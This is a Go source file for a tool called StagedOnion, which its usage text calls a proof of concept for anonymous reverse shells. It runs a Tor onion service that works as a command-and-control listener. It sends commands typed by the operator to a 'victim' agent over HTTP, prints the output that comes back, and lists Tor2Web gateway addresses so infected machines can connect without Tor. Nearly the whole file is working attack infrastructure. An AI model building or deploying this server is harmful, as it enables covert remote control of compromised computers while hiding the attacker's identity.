package main

import (
	"bufio"
	"context"
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"strings"
	"time"

	"github.com/cretz/bine/tor"
)

type reverseHandler struct {
	command      string // Current command to be executed by the agent
	prompt       string // The user input prompt text (E.G '>' or 'shell>')
	instantiated bool   // If a connection is made
	waiting      bool   // If the server is waiting for a response from the agent
}

func (rh *reverseHandler) ServeHTTP(w http.ResponseWriter, r *http.Request) {
	switch r.Method {
	// Upon a get request send the command to run to the victim
	case http.MethodGet:
		// Check if the victim has connected already, if not, show welcome
		if !rh.instantiated {
			fmt.Println("[+] Received reverse shell connection!")
			rh.instantiated = true
		}
		// Send the command
		if !rh.waiting && rh.instantiated {
			// Get input for the next command
			reader := bufio.NewReader(os.Stdin)
			fmt.Print(rh.prompt)
			text, _ := reader.ReadString('\n')
			rh.command = text
			w.Write([]byte(rh.command))
			// Start waiting for a response
			rh.waiting = true
		} else {
			// If we are waiting for a response but receive another cmd request, send a blank command
			w.Write([]byte(""))
		}

	// A post request signifies command output, so, ouput the data to the screen accordingly
	case http.MethodPost:
		// Decode the request body and print to stdout
		bodyBytes, err := ioutil.ReadAll(r.Body)
		if err != nil {
			fmt.Println("[-] Response received but cannot be decoded")
			// Finished waiting
			rh.waiting = false
		}
		bodyString := string(bodyBytes)
		decodedBody, err := url.QueryUnescape(bodyString)
		if err != nil {
			fmt.Println("[-] Response received but cannot be decoded (url encoding)")
			// Finished waiting
			rh.waiting = false
		}
		// Finished waiting
		rh.waiting = false
		fmt.Println(decodedBody)
	}
}

func main() {
	fmt.Println("StagedOnion | @jamesfoxdev | github.com/jamesfoxdev")

	flag.Usage = func() {
		fmt.Println("A PoC for creating anonymous reverse shells and file hosting, accessible from computers without Tor installed.")
		flag.PrintDefaults()
	}
	shell := flag.Bool("shell", false, "Start the reverse HTTP listener")
	directory := flag.String("dir", "", "A directory to serve")
	clear := flag.Bool("clear", false, "Clear the working directory of old temporary Tor files")
	flag.Parse()

	if *clear {
		exec.Command("rm", "data-dir-*")
		fmt.Println("[*] Cleared temp files")
	}

	// Either --shell or --dir need to be called so check for that
	if *directory == "" && !*shell {
		fmt.Println("[-] Requires either --shell or --dir or both")
		os.Exit(1)
	}

	// A shell cannot exist at the same time as serving a directory, so check if those flags where set together
	if *shell && *directory != "" {
		fmt.Println("[-] Cannot user --shell and --dir in conjunction")
		os.Exit(1)
	}

	// Get a list of Tor2Web gateway extensions from ./extensions.txt
	file, err := ioutil.ReadFile("extensions.txt")
	if err != nil {
		log.Panicf("Cannot open extensions.txt: %v", err)
	}
	extensions := strings.Split(string(file), "\n")

	// Start tor with default config (can set start conf's DebugWriter to os.Stdout for debug logs)
	fmt.Println("[*] Starting and registering onion service, please wait a couple of minutes...")
	t, err := tor.Start(nil, nil)
	if err != nil {
		log.Panicf("Unable to start Tor: %v", err)
	}
	defer t.Close()

	// Wait at most a few minutes to publish the service
	listenCtx, listenCancel := context.WithTimeout(context.Background(), 3*time.Minute)
	defer listenCancel()

	// Create a v3 onion service to listen on any port but show as 80
	onion, err := t.Listen(listenCtx, &tor.ListenConf{Version3: true, RemotePorts: []int{80}})
	if err != nil {
		log.Panicf("Unable to create onion service: %v", err)
	}
	defer onion.Close()
	fmt.Printf("[*] Listener started at http://%v.onion\n", onion.ID)
	fmt.Println("[*] Potential entrypoints are:")
	for _, ext := range extensions {
		fmt.Printf("\t http://%v%v\n", onion.ID, ext)
	}

	// Create the reverse HTTP mux and reverse handler
	httpServer := http.NewServeMux()

	if *shell {
		fmt.Println("[*] Waiting for shell connection...")
		// Set initial conditions to waiting to provent overiding a the initial command that may not have been executed yet
		rh := &reverseHandler{command: "", prompt: "shell> ", waiting: false}
		httpServer.Handle("/", rh)
	}

	if *directory != "" {
		fs := http.FileServer(http.Dir(*directory))
		httpServer.Handle("/", fs)
		fmt.Printf("[*] Serving directory '%v'\n", *directory)
	}

	// Start the hidden service
	http.Serve(onion, httpServer)
}
